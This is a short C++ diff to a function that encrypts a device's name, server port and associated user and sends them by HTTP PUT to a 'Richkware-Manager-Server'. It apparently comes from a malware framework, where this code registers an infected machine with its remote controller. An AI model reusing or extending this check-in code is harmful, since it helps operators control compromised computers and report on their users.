@@ -177,16 +177,14 @@ Network::UploadInfoToRMS(const std::string &serverAddress, const std::string &po
 
     name = crypto.Encrypt(name, defaultEncryptionKey);
 
-    // encrypt only serverPort because name is used by the server to recognize the device
-    std::string serverPortS = crypto.Encrypt(serverPort);
-    //Device device = Device(name, serverPortS);
-    //std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
-
-    std::string associatedUserS = crypto.Encrypt(associatedUser);
+    std::string dataEnc = crypto.Encrypt("{\"serverPort\":\"" +
+                                         serverPort +
+                                         "\",\"associatedUser\":\"" +
+                                         associatedUser +
+                                         "\"}");
 
     std::string packet = "PUT /Richkware-Manager-Server/device?data0=" + name +
-                         "&data1=" + serverPortS +
-                         "&data2=" + associatedUserS +
+                         "&data=" + dataEnc +
                          "&channel=richkware"
                          " HTTP/1.1\r\n" +
                          "Host: " + serverAddress + "\r\n" +
